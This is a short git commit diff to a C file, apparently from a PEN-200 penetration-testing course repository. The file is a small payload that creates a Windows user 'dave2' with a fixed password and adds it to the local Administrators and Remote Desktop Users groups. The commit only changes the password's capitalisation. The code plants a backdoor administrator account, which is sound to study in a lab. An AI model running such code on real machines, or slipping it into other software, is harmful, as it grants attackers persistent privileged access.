bbbb1d6af2c81b61783118e63408ecb9e6680d9a
TiagoCalmon <63727674+TiagoCalmon@users.noreply.github.com>
2023-12-02 18:49:27 -0300

    Update adduser.c

--- PEN200/adduser.c
+++ PEN200/adduser.c
@@ -4,7 +4,7 @@ int main ()
 {
   int i;
   
-  i = system ("net user dave2 password123! /add");
+  i = system ("net user dave2 Password123! /add");
   i = system ("net localgroup administrators dave2 /add");
   i = system ("net localgroup 'Remote Desktop Users' dave2 /add");
   
